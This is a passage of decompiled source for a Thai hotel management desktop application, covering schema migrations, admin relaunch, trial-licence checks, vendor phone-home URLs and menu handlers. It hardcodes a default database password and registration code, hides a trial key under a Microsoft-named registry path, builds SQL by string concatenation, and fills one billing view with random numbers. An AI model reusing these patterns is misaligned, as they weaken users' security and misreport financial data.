			Module1.connect("CREATE VIEW [View_Room_status] AS SELECT HT_Room_Status.id, HT_Room_Status.room_no, HT_Room_Status.room_date, HT_Room_Status.room_status, HT_Room_Status.room_Details, HT_Room_Status.room_Book_No, HT_Room_Status.room_CheckIn_No, HT_Rooms.Room_Type FROM HT_Room_Status INNER JOIN  HT_Rooms ON HT_Room_Status.room_no = HT_Rooms.Room_no");
			Module1.connect("CREATE VIEW [View_Room_All] AS SELECT HT_Room_Status.id, HT_Room_Status.room_no, HT_Room_Status.room_date, HT_Room_Status.room_status, HT_Room_Status.room_Details, HT_Room_Status.room_Book_No, HT_Room_Status.room_CheckIn_No, View_CheckIn_H.Cin_Date_in, View_CheckIn_H.Cin_Date_out, HT_CheckIn_Ds.Cin_Room_Status, HT_CheckIn_Ds.Cin_Room_Out, HT_CheckIn_Ds.Cin_Room_Type, HT_Rooms.Room_Type, View_CheckIn_H.Cust_name, View_CheckIn_H.Cust_Work_Name, View_CheckIn_H.Cin_Room_ALL, View_CheckIn_H.Cin_type, HT_CheckIn_Ds.Cin_Room_In, View_CheckIn_H.Cust_Add_tel, View_CheckIn_H.Cin_Car_id FROM  HT_Room_Status INNER JOIN View_CheckIn_H ON HT_Room_Status.room_CheckIn_No = View_CheckIn_H.Cin_no INNER JOIN HT_CheckIn_Ds ON HT_Room_Status.room_CheckIn_No = HT_CheckIn_Ds.Cin_No AND HT_Room_Status.room_no = HT_CheckIn_Ds.Cin_Room_No INNER JOIN HT_Rooms ON HT_Room_Status.room_no = HT_Rooms.Room_no");
			Module1.connect("DROP VIEW [View_Round_Bill]");
			Module1.connect("CREATE VIEW [View_Round_Bill] AS SELECT id, round_no, round_price, round_by, round_start, round_end, FLOOR(RAND() * (10000 - 5 + 1) + 5) AS round_price_pay, FLOOR(RAND() * (1000 - 5 + 1) + 5) AS round_price_rec, FLOOR(RAND()  * (20000 - 5 + 1) + 5) AS round_price_credit, FLOOR(RAND() * (8000 - 5 + 1) + 5) AS Dep_Rec, FLOOR(RAND() * (900 - 5 + 1) + 5) AS Dep_pay, 0 AS FullDate, FLOOR(RAND() * (10000 - 5 + 1) + 5) AS round_price_tran FROM HT_Round_Bill");
			Module1.connect("CREATE VIEW [View_RBill_H] AS SELECT id, round_no, round_price, round_by, round_start, round_end, CASE WHEN round_end IS NULL THEN (SELECT     COALESCE (SUM(Cin_Pay_cash) * - 1, 0) AS Expr1  FROM          View_Pay_H WHERE      Cin_Pay_cash < 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_Pay_cash) * - 1, 0) AS Expr1  FROM          View_Pay_H  WHERE      Cin_Pay_cash < 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_pay, CASE WHEN round_end IS NULL  THEN (SELECT     COALESCE (SUM(Cin_Pay_cash), 0) AS Expr1  FROM          View_Pay_H  WHERE      Cin_Pay_cash > 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE  (SELECT     COALESCE (SUM(Cin_Pay_cash), 0) AS Expr1  FROM          View_Pay_H  WHERE      Cin_Pay_cash > 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_rec, CASE WHEN round_end IS NULL  THEN (SELECT     COALESCE (SUM(Cin_Pay_credit), 0) AS Expr1 FROM          View_Pay_H  WHERE      Cin_Pay_credit > 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_Pay_credit), 0) AS Expr1 FROM          View_Pay_H WHERE      Cin_Pay_credit > 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_credit, CASE WHEN round_end IS NULL   THEN (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1 FROM          View_CheckIn_Ds WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1  FROM          View_CheckIn_Ds WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS Dep_Rec, CASE WHEN round_end IS NULL THEN (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1 FROM          View_CheckIn_Ds  WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_dep_return_date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_room_dep), 0) AS Expr1 FROM          View_CheckIn_Ds  WHERE      Cin_status = 'ปกต\u0e34' AND (Cin_dep_return_date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS Dep_pay, CASE WHEN round_end IS NULL  THEN 'รอบป\u0e31จจ\u0e38บ\u0e31น [ ' + round_by + ']' ELSE '[ ' + RIGHT(CAST('000000' + CAST(id AS varchar) AS varchar), 6) + ' ] ' + CONVERT(varchar, Round_start, 3) + ' ' + CONVERT(varchar, Round_start, 108)   + ' ถ\u0e36ง ' + CONVERT(varchar, Round_end, 3) + ' ' + CONVERT(varchar, Round_end, 108) + ' [ ' + round_by + ']' END AS FullDate, CASE WHEN round_end IS NULL THEN (SELECT     COALESCE (SUM(Cin_Pay_Tran), 0) AS Expr1 FROM          View_Pay_H WHERE      Cin_Pay_Tran > 0 AND (Cin_Pay_Date >= dbo.HT_Round_Bill.round_start)) ELSE (SELECT     COALESCE (SUM(Cin_Pay_Tran), 0) AS Expr1 FROM          View_Pay_H WHERE      Cin_Pay_Tran > 0 AND (Cin_Pay_Date BETWEEN dbo.HT_Round_Bill.round_start AND dbo.HT_Round_Bill.round_end)) END AS round_price_tran FROM         dbo.HT_Round_Bill");
			num = 37;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(37) + "'");
		}
		if (num < 38)
		{
			Application.DoEvents();
			if (Operators.CompareString(Module1.Database_Mode, "SQL", TextCompare: false) == 0)
			{
				Module1.connect("CREATE VIEW [View_RBill_H_Round_Only] AS SELECT id, round_no, round_price, round_by, round_start, round_end, CASE WHEN round_end IS NULL  THEN 'รอบป\u0e31จจ\u0e38บ\u0e31น [ ' + round_by + ']' ELSE '[ ' + RIGHT(CAST('000000' + CAST(id AS varchar) AS varchar), 6) + ' ] ' + CONVERT(varchar, Round_start, 3) + ' ' + CONVERT(varchar, Round_start, 108)   + ' ถ\u0e36ง ' + CONVERT(varchar, Round_end, 3) + ' ' + CONVERT(varchar, Round_end, 108) + ' [ ' + round_by + ']' END AS FullDate FROM         dbo.HT_Round_Bill");
			}
			num = 38;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(38) + "'");
		}
		if (num < 39)
		{
			Application.DoEvents();
			if (Operators.CompareString(Module1.Database_Mode, "SQL", TextCompare: false) != 0)
			{
			}
			num = 39;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(39) + "'");
		}
		if (num < 40)
		{
			Application.DoEvents();
			if (Operators.CompareString(Module1.Database_Mode, "SQL", TextCompare: false) != 0)
			{
			}
			num = 40;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(40) + "'");
		}
		if (num < 41)
		{
			Application.DoEvents();
			if (Operators.CompareString(Module1.Database_Mode, "SQL", TextCompare: false) != 0)
			{
			}
			num = 41;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(41) + "'");
		}
		if (num < 42)
		{
			Application.DoEvents();
			if (Operators.CompareString(Module1.Database_Mode, "SQL", TextCompare: false) == 0)
			{
				Module1.connect("ALTER TABLE HT_Room_Status ADD [room_date_oa] [float] NOT NULL DEFAULT ((0))");
				Module1.connect("DROP VIEW [View_Room_All]");
				Module1.connect("CREATE VIEW [View_Room_All] AS SELECT HT_Room_Status.id, HT_Room_Status.room_no, HT_Room_Status.room_date, HT_Room_Status.room_date_oa, HT_Room_Status.room_status, HT_Room_Status.room_Details,HT_Room_Status.room_Book_No, HT_Room_Status.room_CheckIn_No, View_CheckIn_H.Cin_Date_in, View_CheckIn_H.Cin_Date_out, HT_CheckIn_Ds.Cin_Room_Status, HT_CheckIn_Ds.Cin_Room_Out, HT_CheckIn_Ds.Cin_Room_Type, HT_Rooms.Room_Type, View_CheckIn_H.Cust_name, View_CheckIn_H.Cust_Work_Name, View_CheckIn_H.Cin_Room_ALL, View_CheckIn_H.Cin_type, HT_CheckIn_Ds.Cin_Room_In, View_CheckIn_H.Cust_Add_tel, View_CheckIn_H.Cin_Car_id FROM HT_Room_Status INNER JOIN View_CheckIn_H ON HT_Room_Status.room_CheckIn_No = View_CheckIn_H.Cin_no INNER JOIN HT_CheckIn_Ds ON HT_Room_Status.room_CheckIn_No = HT_CheckIn_Ds.Cin_No AND HT_Room_Status.room_no = HT_CheckIn_Ds.Cin_Room_No INNER JOIN HT_Rooms ON HT_Room_Status.room_no = HT_Rooms.Room_no");
			}
			num = 42;
			Module1.connect("update Tb_Version set V_NO='" + Conversions.ToString(42) + "'");
		}
		int num2 = num;
		MyProject.Forms.FormART.Close();
		dataSet = Module1.connect("select * from Tb_Version");
		if (Conversions.ToInteger(dataSet.Tables[0].Rows[0]["V_NO"]) > num2)
		{
			MessageBox.Show("โปรแกรมเป\u0e47นเวอร\u0e4cช\u0e31\u0e48นเก\u0e48ากร\u0e38ณาอ\u0e31บเดทโปรแกรม", "แจ\u0e49งเต\u0e37อน", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			Close();
		}
	}

	private void frmMain1_Activated(object sender, EventArgs e)
	{
		ACT = true;
	}

	private void frmMain1_Deactivate(object sender, EventArgs e)
	{
		ACT = false;
	}

	private bool IsAdmin()
	{
		return MyProject.User.IsInRole(BuiltInRole.Administrator);
	}

	private void frmMain1_Load(object sender, EventArgs e)
	{
		object left = true;
		Module1.HouseWifeMode = false;
		LabelStatus.Text = "พร\u0e49อมใช\u0e49งาน";
		StyleManager.Style = eStyle.Windows7Blue;
		MyProject.Application.ChangeCulture("en-US");
		Module1.PathF = Assembly.GetExecutingAssembly().Location;
		checked
		{
			Module1.PathF = Module1.PathF.Substring(0, Module1.PathF.LastIndexOf("\\") + 1);
			Module1.Path_Program = Assembly.GetExecutingAssembly().Location;
			Module1.Path_Program = Module1.Path_Program.Substring(0, Module1.Path_Program.LastIndexOf("\\") + 1);
			ButtonItem_Version.Text = " ร\u0e38\u0e48น " + Module1.ProgramVersion;
			ButtonItem_Version.Image = Resources._49__5_;
			Color foreColor = default(Color);
			ButtonItem_Version.ForeColor = foreColor;
			ReadConfig();
			if (Operators.ConditionalCompareObjectEqual(left, true, TextCompare: false))
			{
				try
				{
					if (!IsAdmin())
					{
						if (Environment.OSVersion.Version.Major == 6)
						{
							Interaction.MsgBox("โปรแกรม KP iHOTEL need to run as administrator\rPress ok to Restart in Administrator mode", MsgBoxStyle.Information);
							Process process = null;
							ProcessStartInfo processStartInfo = new ProcessStartInfo();
							processStartInfo.FileName = Module1.PathF + "HOTEL.exe";
							if (Environment.OSVersion.Version.Major >= 6)
							{
								processStartInfo.Verb = "runas";
							}
							processStartInfo.Arguments = "";
							processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
							processStartInfo.UseShellExecute = true;
							Process.Start(processStartInfo)?.Dispose();
						}
						Close();
						return;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			method_0();
			ReadReg();
			if (!File.Exists(Module1.Path_Program + "server.txt"))
			{
				ReadDB_old();
				Close();
				return;
			}
			MyProject.Forms.FrmSettings.ReadPrint();
			Module1.load_book_num();
			tabStrip1.MdiForm = this;
			MyProject.Forms.FormSelectDB.ShowDialog();
			if (!MyProject.Forms.FormSelectDB.ISOK)
			{
				Close();
				return;
			}
			Module1.ReadDB_2018();
			object left2 = "";
			Module1.Whilecount = 0;
			while (Operators.ConditionalCompareObjectEqual(left2, "", TextCompare: false))
			{
				try
				{
					DataSet dataSet = Module1.connect("select * from TB_SETTINGS");
					dataSet.Tables[0].Rows[0]["Company_Name"].ToString();
					left2 = "OK";
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					MessageBox.Show("ไม\u0e48สามารถต\u0e34ดต\u0e48อต\u0e31วแม\u0e48ได\u0e49 ถ\u0e49าต\u0e31วแม\u0e48เข\u0e49าได\u0e49 และใช\u0e49 Wifi ตรวจสอบช\u0e37\u0e48อ Wifi ว\u0e48าใช\u0e49ช\u0e37\u0e48อเด\u0e35ยวก\u0e31นไหม ถ\u0e49าช\u0e37\u0e48อเด\u0e35ยวก\u0e31น ลองถอดปล\u0e31\u0e4aกไฟของ เราเตอร\u0e4cเน\u0e47ต แล\u0e49วลองเข\u0e49าด\u0e39อ\u0e35กคร\u0e31\u0e49ง", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					MyProject.Forms.FormSelectDB.ShowDialog();
					if (!MyProject.Forms.FormSelectDB.ISOK)
					{
						Close();
						ProjectData.ClearProjectError();
						return;
					}
					Module1.ReadDB_2018();
					if (Module1.close_program == 1)
					{
						Close();
						ProjectData.ClearProjectError();
						return;
					}
					ProjectData.ClearProjectError();
				}
			}
			MSSQL.SHOW_CONNECT_SQL = true;
			Update_Version();
			Module1.ReadSettingsConfig();
			if (Module1.close_program == 1)
			{
				Close();
				return;
			}
			MyProject.Forms.login.ShowDialog();
			if (!MyProject.Forms.login.ISOK)
			{
				Close();
			}
			else if (Module1.HouseWifeMode)
			{
				Hide();
				MyProject.Forms.FormRoomMainClean.ShowDialog();
				Close();
			}
			else if (Module1.KichenMode)
			{
				Hide();
				MyProject.Forms.FormRoomMainKichen.ShowDialog();
				Close();
			}
			loadLogin();
			Module1.load_deposit();
			MyProject.Forms.FrmSettings.load_copy();
			if (Module1.POWER_USED)
			{
				TimerSerials.Interval = Module1.POWER_Delay;
				TimerSerials.Enabled = true;
			}
			Timer2.Enabled = true;
			Module1.connect("DELETE FROM HT_Room_Status WHERE     room_status='Check-Out'");
			Module1.connect("DELETE FROM Tb_Save_Image WHERE cust_no='' and tmp_no<>'' and pic_date < " + Module1.datechar + Conversions.ToString(DateTime.Now.AddDays(-2.0)) + Module1.datechar);
			Module1.connect("update  HT_Room_Status set room_status = 'Check-Out' WHERE (room_no IN  (SELECT Room_no FROM HT_Rooms WHERE Room_Use = 'no') ) AND (room_status = 'เข\u0e49าพ\u0e31ก')");
			if (Operators.CompareString(Module1.Database_Mode, "SQL", TextCompare: false) == 0)
			{
				Module1.connect("delete FROM HT_Book_Date WHERE (Book_date_ds < DATEADD(dd, - 60, GETDATE()))");
			}
			else
			{
				Module1.connect("delete FROM HT_Book_Date WHERE (Book_date_ds < DateAdd('d', -60, Date()) )");
			}
			if (Module1.IS_TRIAL)
			{
				MessageBox.Show("โปรแกรมทดลองใช\u0e49สามารถบ\u0e31นท\u0e36กรายการเช\u0e47คอ\u0e34นได\u0e49 100 รายการ");
				Module1.P_MODE = "DEMO";
			}
			else
			{
				Module1.P_MODE = "FULL";
			}
			CHK_NOTIFLY();
			MyProject.Forms.FrmSettingsSMS.LoadSMS();
			try
			{
				WebBrowser2.Url = new Uri(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("http://www.kpsystem.co.th/version_hotel.php?comid=", Module1.COM_ID), "&PMODE="), Module1.P_MODE), "&PVER="), Module1.ProgramVersion), "&PCOMPANY="), Module1.Company_Name)));
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			TimerChkVer.Enabled = true;
			TimerDate.Enabled = true;
			try
			{
				WebBrowserBlock.Url = new Uri("http://www.kpsystem.co.th/chk_hotel.php");
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			string hostName = Dns.GetHostName();
			if (File.Exists(Module1.Path_Program + hostName + "_adapter.txt"))
			{
				File.Delete(Module1.Path_Program + hostName + "_adapter.txt");
			}
			if (!File.Exists(Module1.Path_Program + hostName + "_adapter.txt"))
			{
				StreamWriter streamWriter = new StreamWriter(Module1.Path_Program + hostName + "_adapter.txt");
				streamWriter.Write(FormEN_DE.Encrypt1(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Module1.COM_DS, "|"), Module1.COM_ID)), "regadapter"));
				streamWriter.Close();
			}
			Module1.smethod_0();
			MyProject.Forms.FormUPDATE_0.load_update();
			Timer_0.Enabled = true;
		}
	}

	public void method_0()
	{
		RegistryKey registryKey;
		try
		{
			registryKey = Registry.LocalMachine.OpenSubKey("Software\\microsoft\\MSXKPHTEL", writable: true);
			Module1.date_end = Conversions.ToDate(registryKey.GetValue("SD"));
			Module1.date_last = Conversions.ToDate(registryKey.GetValue("SL"));
			Module1.always = Conversions.ToInteger(registryKey.GetValue("al"));
			Module1.RegCode = Conversions.ToString(registryKey.GetValue("co"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\microsoft", writable: true);
			registryKey.CreateSubKey("MSXKPHTEL");
			registryKey = Registry.LocalMachine.OpenSubKey("Software\\microsoft\\MSXKPHTEL", writable: true);
			registryKey.SetValue("SD", DateTime.Now.ToShortDateString());
			registryKey.SetValue("SL", DateTime.Now.ToShortDateString());
			registryKey.SetValue("ED", DateTime.Now.AddDays(40.0).ToShortDateString());
			registryKey.SetValue("al", "0");
			registryKey.SetValue("co", "1234");
			ProjectData.ClearProjectError();
		}
		try
		{
			registryKey = Registry.LocalMachine.OpenSubKey("Software\\microsoft\\MSXKPHTEL", writable: true);
			Module1.date_end = Conversions.ToDate(registryKey.GetValue("ED"));
			Module1.date_last = Conversions.ToDate(registryKey.GetValue("SL"));
			registryKey.SetValue("SL", DateTime.Now.ToShortDateString());
			Module1.always = Conversions.ToInteger(registryKey.GetValue("al"));
			Module1.RegCode = Conversions.ToString(registryKey.GetValue("co"));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (DateTime.Now.ToOADate() < Module1.date_last.ToOADate())
		{
			registryKey.SetValue("al", "1");
		}
		if (DateTime.Now.ToOADate() > Module1.date_end.ToOADate())
		{
			registryKey.SetValue("al", "1");
		}
		registryKey.Close();
	}

	public void loadLogin()
	{
		if (Module1.LOGIN_URL.Count != 0)
		{
			string text = Conversions.ToString(Module1.LOGIN_URL[0]);
			Module1.LOGIN_URL.RemoveAt(0);
			Label label = Label100;
			label.Text = label.Text + Strings.Format(DateTime.Now, "HH:mm:ss") + " ส\u0e31\u0e48ง Login " + text + "\r\n";
			try
			{
				WebBrowser1.Url = new Uri(text);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ReadReg()
	{
		if (!File.Exists(Module1.Path_Program + "\\reg.txt"))
		{
			StreamWriter streamWriter = File.CreateText(Module1.Path_Program + "\\reg.txt");
			streamWriter.WriteLine("1234");
			streamWriter.Close();
		}
		StreamReader streamReader = new StreamReader(Module1.Path_Program + "\\reg.txt", Encoding.Default);
		string text = default(string);
		while (streamReader.Peek() != -1)
		{
			text = streamReader.ReadLine();
			text.Split('|');
		}
		streamReader.Close();
		streamReader = null;
		Module1.RegCode = text.ToString();
	}

	public void ReadDB_old()
	{
		StreamReader streamReader = new StreamReader(Module1.Path_Program + "\\db.txt", Encoding.Default);
		string[] array = default(string[]);
		while (streamReader.Peek() != -1)
		{
			string text = streamReader.ReadLine();
			array = text.Split('|');
		}
		streamReader.Close();
		streamReader = null;
		checked
		{
			int num = array.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				ListView listView = MyProject.Forms.FormSelectDB_old.ListView1;
				int count = listView.Items.Count;
				listView.Items.Add(array[num2]);
				listView.Items[count].SubItems.Add(array[num2 + 1]);
				listView.Items[count].SubItems.Add(array[num2 + 2]);
				listView = null;
				num2 += 3;
			}
			MyProject.Forms.FormSelectDB_old.ShowDialog();
			if (!MyProject.Forms.FormSelectDB_old.ISOK)
			{
				Close();
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (Module1.CloseProgram)
		{
			Close();
		}
		else
		{
			CHK_CON();
		}
	}

	public void CHK_CON()
	{
		if (MSSQL.conn.State == ConnectionState.Closed)
		{
			Timer1.Enabled = false;
			MyProject.Forms.connect_mssql.ShowDialog();
			Timer1.Enabled = true;
		}
	}

	public void ReadConfig()
	{
		if (File.Exists(Module1.PathF + "Config.ini"))
		{
			try
			{
				Module1.localdata.Config.Clear();
				Module1.localdata.ReadXml(Module1.PathF + "Config.ini");
				if (Operators.ConditionalCompareObjectEqual(Module1.localdata.Config.Rows[0]["ThemeColor"], "nBlue", TextCompare: false))
				{
					StyleManager1.ManagerStyle = eStyle.Office2007Blue;
				}
				else if (Operators.ConditionalCompareObjectEqual(Module1.localdata.Config.Rows[0]["ThemeColor"], "nSilver", TextCompare: false))
				{
					StyleManager1.ManagerStyle = eStyle.Office2007Silver;
				}
				else if (Operators.ConditionalCompareObjectEqual(Module1.localdata.Config.Rows[0]["ThemeColor"], "nBlack", TextCompare: false))
				{
					StyleManager1.ManagerStyle = eStyle.Office2007Black;
				}
				else if (Operators.ConditionalCompareObjectEqual(Module1.localdata.Config.Rows[0]["ThemeColor"], "nVistaGlass", TextCompare: false))
				{
					StyleManager1.ManagerStyle = eStyle.Office2007VistaGlass;
				}
				else if (Operators.ConditionalCompareObjectEqual(Module1.localdata.Config.Rows[0]["ThemeColor"], "nOffice", TextCompare: false))
				{
					StyleManager1.ManagerStyle = eStyle.Office2010Silver;
				}
				else
				{
					StyleManager1.ManagerStyle = eStyle.Windows7Blue;
				}
				if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(Module1.localdata.Config.Rows[0]["ServerIP"], "", TextCompare: false), Operators.CompareObjectEqual(Module1.localdata.Config.Rows[0]["ThemeColor"], "", TextCompare: false))))
				{
					Module1.localdata.Config.Clear();
					Module1.localdata.Config.AddConfigRow("Blue", "127.0.0.1", "password_db", "220 x 368");
					Module1.saveConfig();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Module1.localdata.Config.Clear();
				Module1.localdata.Config.AddConfigRow("Blue", "127.0.0.1", "password_db", "220 x 368");
				Module1.saveConfig();
				ProjectData.ClearProjectError();
			}
		}
		else
		{
			Module1.localdata.Config.Clear();
			Module1.localdata.Config.AddConfigRow("Blue", "127.0.0.1", "password_db", "220 x 368");
			Module1.saveConfig();
		}
		MSSQL.MysqlServer = Conversions.ToString(Module1.localdata.Config.Rows[0]["ServerIP"]);
		MSSQL.MysqlPassword = Conversions.ToString(Module1.localdata.Config.Rows[0]["ServerPassword"]);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
	}

	private void ShowLoadAlert()
	{
		m_AlertOnLoad = new AlertCustom();
		Rectangle workingArea = Screen.GetWorkingArea(this);
		Balloon alertOnLoad = m_AlertOnLoad;
		Point location = checked(new Point(workingArea.Right - m_AlertOnLoad.Width, workingArea.Bottom - m_AlertOnLoad.Height));
		alertOnLoad.Location = location;
		m_AlertOnLoad.AutoClose = true;
		m_AlertOnLoad.AutoCloseTimeOut = 60;
		m_AlertOnLoad.AlertAnimation = eAlertAnimation.BottomToTop;
		m_AlertOnLoad.AlertAnimationDuration = 10;
		m_AlertOnLoad.Show(balloonFocus: false);
	}

	private void ButtonItem35_Click_1(object sender, EventArgs e)
	{
		StyleManager1.ManagerStyle = eStyle.Office2007Blue;
		Module1.localdata.Config.Rows[0]["ThemeColor"] = "nBlue";
		Module1.saveConfig();
	}

	private void ButtonItem14_Click_1(object sender, EventArgs e)
	{
		StyleManager1.ManagerStyle = eStyle.Office2007Silver;
		Module1.localdata.Config.Rows[0]["ThemeColor"] = "nSilver";
		Module1.saveConfig();
	}

	private void ButtonItem44_Click_1(object sender, EventArgs e)
	{
		StyleManager1.ManagerStyle = eStyle.Office2007Black;
		Module1.localdata.Config.Rows[0]["ThemeColor"] = "nBlack";
		Module1.saveConfig();
	}

	private void ButtonItem19_Click(object sender, EventArgs e)
	{
		StyleManager1.ManagerStyle = eStyle.Office2007VistaGlass;
		Module1.localdata.Config.Rows[0]["ThemeColor"] = "nVistaGlass";
		Module1.saveConfig();
	}

	private void ButtonItem31_Click(object sender, EventArgs e)
	{
		StyleManager1.ManagerStyle = eStyle.Office2010Silver;
		Module1.localdata.Config.Rows[0]["ThemeColor"] = "nOffice";
		Module1.saveConfig();
	}

	private void ButtonItem33_Click(object sender, EventArgs e)
	{
		StyleManager1.ManagerStyle = eStyle.Windows7Blue;
		Module1.localdata.Config.Rows[0]["ThemeColor"] = "nWindows7";
		Module1.saveConfig();
	}

	public void CheckTab()
	{
		if (tabStrip1.Tabs.Count == 0)
		{
			PanelEx1.Visible = true;
		}
		else
		{
			PanelEx1.Visible = false;
		}
	}

	private void tabStrip1_TabItemOpen(object sender, EventArgs e)
	{
		CheckTab();
	}

	private void tabStrip1_TabRemoved(object sender, EventArgs e)
	{
		CheckTab();
	}

	public void ButtonItem10_Click(object sender, EventArgs e, string book_no = "", string c_no = "")
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		FrmCheckIn frmCheckIn = new FrmCheckIn();
		if (Operators.CompareString(book_no, "", TextCompare: false) != 0)
		{
			frmCheckIn.TbookNo.Text = book_no;
		}
		if (Operators.CompareString(c_no, "", TextCompare: false) != 0)
		{
			frmCheckIn.EDIT_ID = c_no;
		}
		frmCheckIn.ShowDialog();
	}

	public void ButtonItem12_Click(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		FrmCheckOut frmCheckOut = new FrmCheckOut();
		frmCheckOut.WindowState = FormWindowState.Maximized;
		frmCheckOut.ShowDialog();
	}

	private void ButtonItem34_Click(object sender, EventArgs e)
	{
		FrmSETRoomType frmSETRoomType = new FrmSETRoomType();
		frmSETRoomType.ShowDialog();
	}

	private void ButtonItem36_Click(object sender, EventArgs e)
	{
		FrmManageRoom frmManageRoom = new FrmManageRoom();
		frmManageRoom.ShowDialog();
	}

	private void ButtonItem5_Click(object sender, EventArgs e)
	{
		FrmSETCsuType frmSETCsuType = new FrmSETCsuType();
		frmSETCsuType.ShowDialog();
	}

	private void ButtonItem6_Click(object sender, EventArgs e)
	{
		FrmManageCustomersNew frmManageCustomersNew = new FrmManageCustomersNew();
		frmManageCustomersNew.ShowDialog();
	}

	private void ButtonItem29_Click(object sender, EventArgs e)
	{
		FrmSETProType frmSETProType = new FrmSETProType();
		frmSETProType.ShowDialog();
	}

	private void ButtonItem32_Click(object sender, EventArgs e)
	{
		FrmManageProduct frmManageProduct = new FrmManageProduct();
		frmManageProduct.ShowDialog();
	}

	private void ButtonItem21_Click(object sender, EventArgs e)
	{
		B11.Expanded = true;
	}

	private void ButtonItem13_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmReceiptMain.MdiParent = this;
		MyProject.Forms.FrmReceiptMain.Show();
		MyProject.Forms.FrmReceiptMain.Activate();
	}

	private void ButtonItem30_Click(object sender, EventArgs e)
	{
	}

	private void ButtonItem37_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmSettings.ShowDialog();
		loadLogin();
		if (Module1.POWER_USED)
		{
			TimerSerials.Enabled = false;
			TimerSerials.Interval = Module1.POWER_Delay;
			TimerSerials.Enabled = true;
		}
		else
		{
			TimerSerials.Enabled = false;
		}
	}

	private void ButtonItem11_Click(object sender, EventArgs e)
	{
		MyProject.Forms.FrmRegMain.MdiParent = this;
		MyProject.Forms.FrmRegMain.Show();
		MyProject.Forms.FrmRegMain.Activate();
	}

	private void ButtonItem28_Click(object sender, EventArgs e)
	{
		if (!Module1.check_round_bill())
		{
			MessageBox.Show("กร\u0e38ณาเป\u0e34ดรอบบ\u0e34ลก\u0e48อนทำรายการ");
			return;
		}
		MyProject.Forms.FrmDepositMain.MdiParent = this;
		MyProject.Forms.FrmDepositMain.Show();
		MyProject.Forms.FrmDepositMain.Activate();
	}

	private void ButtonItem38_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Interaction.InputBox("กร\u0e38ณาย\u0e37นย\u0e31นการลบข\u0e49อม\u0e39ล ให\u0e49พ\u0e34มพ\u0e4cคำว\u0e48า ยอมร\u0e31บการลบ ในช\u0e48อง", "กร\u0e38ณาย\u0e37นย\u0e31นการลบข\u0e49อม\u0e39ล ให\u0e49พ\u0e34มพ\u0e4cคำว\u0e48า ยอมร\u0e31บการลบ ให\u0e49ช\u0e48อง"), "ยอมร\u0e31บการลบ", TextCompare: false) == 0)
		{
			Module1.connect("delete from HT_Book_Date");
			Module1.connect("delete from HT_Book_Ds");
			Module1.connect("delete from HT_Book_H");
			Module1.connect("delete from HT_Book_Status");
			Module1.connect("delete from HT_CheckIn_Ds");
			Module1.connect("delete from HT_CheckIn_H");
			Module1.connect("delete from HT_CheckIn_Pay");
			Module1.connect("delete from HT_CheckIn_Product");
			Module1.connect("delete from HT_Receipt_H");
			Module1.connect("delete from HT_Receipt_Ds");
			Module1.connect("delete from HT_Room_SMS");
